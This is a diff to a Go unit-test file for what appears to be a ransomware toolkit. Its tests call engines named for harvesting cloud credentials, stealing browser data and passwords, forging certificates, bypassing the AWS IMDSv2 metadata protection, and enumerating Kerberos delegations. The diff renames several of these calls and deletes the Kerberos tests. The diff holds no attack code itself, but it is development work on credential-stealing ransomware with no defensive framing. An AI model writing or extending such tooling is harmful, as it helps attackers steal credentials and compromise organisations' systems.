@@ -28,21 +28,13 @@ func TestNewIdentityDestructionEngine(t *testing.T) {
 	}
 }
 
-func TestNewKerberosDelegationEngine(t *testing.T) {
-	cfg := DefaultRansomwareConfig()
-	k := NewKerberosDelegationEngine(cfg)
-	if k == nil {
-		t.Fatal("NewKerberosDelegationEngine() returned nil")
-	}
-}
-
 func TestCloudExploitEngineInit(t *testing.T) {
 	cfg := DefaultRansomwareConfig()
 	c := NewCloudExploitEngine(cfg)
 
-	creds := c.HarvestCredentials()
+	creds := c.HarvestCloudCreds()
 	if len(creds) == 0 {
-		t.Log("HarvestCredentials returned 0 (expected in non-cloud env)")
+		t.Log("HarvestCloudCreds returned 0 (expected in non-cloud env)")
 	}
 }
 
@@ -50,9 +42,9 @@ func TestIdentityDestructionStealCookies(t *testing.T) {
 	cfg := DefaultRansomwareConfig()
 	id := NewIdentityDestructionEngine(cfg)
 
-	data := id.StealBrowserData()
+	data := id.SearchForPasswords()
 	if len(data) == 0 {
-		t.Log("StealBrowserData returned 0 (expected in test env)")
+		t.Log("SearchForPasswords returned 0 (expected in test env)")
 	}
 }
 
@@ -60,11 +52,11 @@ func TestTrustExploitEngineCerts(t *testing.T) {
 	cfg := DefaultRansomwareConfig()
 	tEngine := NewTrustExploitEngine(cfg)
 
-	cert := tEngine.GenerateCert()
-	if cert == nil {
-		t.Log("GenerateCert returned nil (expected if no crypto lib)")
+	cert, _, err := tEngine.GenerateSelfSignedCert("test.corp.local")
+	if err != nil || cert == nil {
+		t.Log("GenerateSelfSignedCert returned nil (expected if no crypto lib)")
 	} else {
-		t.Logf("Generated cert: %v", cert)
+		t.Logf("Generated cert: %d bytes", len(cert))
 	}
 }
 
@@ -74,14 +66,4 @@ func TestIMDSv2BypassConfig(t *testing.T) {
 		t.Errorf("expected AWSProfile=default, got %s", cfg.AWSProfile)
 	}
 	t.Logf("Cloud config: AWS=%s, Azure=%s, GCP=%s", cfg.AWSProfile, cfg.AzureProfile, cfg.GCPProject)
-}
-
-func TestKerberosDelegationInit(t *testing.T) {
-	cfg := DefaultRansomwareConfig()
-	k := NewKerberosDelegationEngine(cfg)
-
-	result := k.EnumerateDelegations()
-	if len(result) == 0 {
-		t.Log("EnumerateDelegations returned 0 (expected in non-AD env)")
-	}
 }
